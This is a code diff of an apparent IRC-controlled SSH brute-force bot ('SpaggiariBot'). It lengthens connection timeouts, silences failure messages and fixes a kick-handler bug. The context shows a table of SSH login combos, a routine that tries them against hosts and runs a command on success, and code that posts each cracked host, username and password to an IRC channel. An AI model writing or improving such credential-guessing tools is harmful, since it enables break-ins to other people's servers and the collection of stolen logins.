@@ -67,8 +67,8 @@ admin_host = 'admin.host'
 max_threads     = 150
 throttle        = 0
 timeout_breaker = 3
-timeout_port    = 3
-timeout_ssh     = 5
+timeout_port    = 10
+timeout_ssh     = 10
 
 # SSH Login Combos
 combos = OrderedDict([
@@ -245,13 +245,11 @@ def ssh_connect(hostname, username, password):
             stdin,stdout,stderr = ssh.exec_command("echo lol")
             for line in stdout.readlines():
                 SpaggiariBot.sendmsg(channel, line)
-        except Exception as ex:
-            SpaggiariBot.sendmsg(channel, 'Failed to run the command. ({0})'.format(str(ex)))
+        except:
+            pass
     except socket.timeout:
-        SpaggiariBot.sendmsg(channel, '[{0}] - Failed connection to {1} using {2}:{3} (Timeout)'.format(color('-', red), hostname, username, password))
         return 1
     except Exception as ex:
-        SpaggiariBot.sendmsg(channel, '[{0}] - Failed connection to {1} using {2}:{3} ({4})'.format(color('-', red), hostname, username, password, str(ex)))
         return 0
     else:
         SpaggiariBot.sendmsg(channel, '[{0}] - Successful connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
@@ -398,7 +396,7 @@ class IRC(object):
             nick   = args[0].split('!')[0][1:]
             chan   = args[2]
             kicked = args[3]
-            self.event_kick(name, chan, kicked)
+            self.event_kick(nick, chan, kicked)
         elif args[1] == 'PRIVMSG':
             nick = args[0].split('!')[0][1:]
             host = args[0].split('!')[1].split('@')[1]
